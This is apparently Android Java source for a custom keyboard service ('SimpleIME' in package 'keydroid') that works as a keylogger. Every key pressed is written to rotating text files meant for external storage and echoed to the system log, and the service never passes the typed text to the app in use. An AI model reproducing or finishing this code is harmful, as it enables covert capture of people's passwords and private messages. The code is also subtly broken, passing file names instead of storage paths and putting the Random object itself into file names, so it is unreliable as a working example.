package com.example.keydroid;

import android.content.Intent;
import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.media.AudioManager;
import android.os.Environment;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.widget.LinearLayout;
import java.io.File;
import java.util.Date;
import java.util.Random;
import java.io.FileWriter;
import java.io.IOException;


public class SimpleIME extends InputMethodService
        implements KeyboardView.OnKeyboardActionListener {

    private KeyboardView kv;
    private Keyboard keyboard, keyboard_sym;
    private File file;
    private Random rand;
    private String path;
    private Date date;
    private long time;
    private String outputFile;
    private FileWriter fw;
    private char c;
    String TAG = "SimpleIME";

    private boolean caps = false;

    @Override
    public View onCreateInputView() {
        kv = (KeyboardView)getLayoutInflater().inflate(R.layout.keyboard, null);
        keyboard = new Keyboard(this, R.xml.qwerty);
        // keyboard_sym = new Keyboard(this, R.xml.symbol);
        date = new Date();
        rand = new Random();
        path = Environment.getExternalStorageDirectory().getAbsolutePath();
        path += "/";
        time = date.getTime();
        outputFile = path + time + "_" + rand + ".txt";
        file = new File(outputFile);
        try {
            fw = new FileWriter(file.getName());
        } catch (IOException e) {
            e.printStackTrace();
        }
        kv.setKeyboard(keyboard);

        kv.setOnKeyboardActionListener(this);
        Log.e(TAG, "Started");
        return kv;
    }


    @Override
    public void onKey(int primaryCode, int[] keyCodes) {
        playClick(primaryCode);
        String ch = Character.toString((char) primaryCode);
        String character = primaryCode == -1 ? "caps" : ch;
        Log.e(TAG, "Clicked " + primaryCode + " " + character);
        c = (char)primaryCode;
        if(file.length() >= 2048){
            date = new Date();
            rand = new Random();
            time = date.getTime();
            outputFile = path + time + "_" + rand + ".txt";
            file = new File(outputFile);
            try {
                fw = new FileWriter(file.getName());
                fw.write(c);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        else{
            try {
                fw.write(c);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        switch (primaryCode) {
            case Keyboard.KEYCODE_DELETE:
                break;
            case Keyboard.KEYCODE_SHIFT:
                caps = !caps;
                keyboard.setShifted(caps);
                kv.invalidateAllKeys();
                break;
            case Keyboard.KEYCODE_DONE:
                Log.e("SimpleKeyboard", " Hello " + KeyEvent.ACTION_DOWN + " " + KeyEvent.KEYCODE_ENTER);

                break;
            case 1000: {

                // kv.setKeyboard(keyboard_sym);
                break;
            }
            case 1001: {
                //  kv.setKeyboard(keyboard);
                break;
            }

            default:
                char code = (char) primaryCode;
                if (Character.isLetter(code) && caps) {
                    code = Character.toUpperCase(code);
                }
        }

    }

    private void playClick(int keyCode) {
        AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
        switch (keyCode) {
            case 32:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_SPACEBAR);
                break;
            case Keyboard.KEYCODE_DONE:
            case 10:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_RETURN);
                break;
            case Keyboard.KEYCODE_DELETE:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_DELETE);
                break;
            default:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_STANDARD);
        }
    }

    @Override
    public void onPress(int primaryCode) {

        Log.e("SimpleKeyboard", "Hello3 " + primaryCode);

    }

    @Override
    public void onRelease(int primaryCode) {
    }

    @Override
    public void onText(CharSequence text) {

        Log.e("SimpleKeyboard", "Hello2 " + text);
    }

    @Override
    public void swipeDown() {
    }

    @Override
    public void swipeLeft() {
    }

    @Override
    public void swipeRight() {
    }

    @Override
    public void swipeUp() {
    }
}
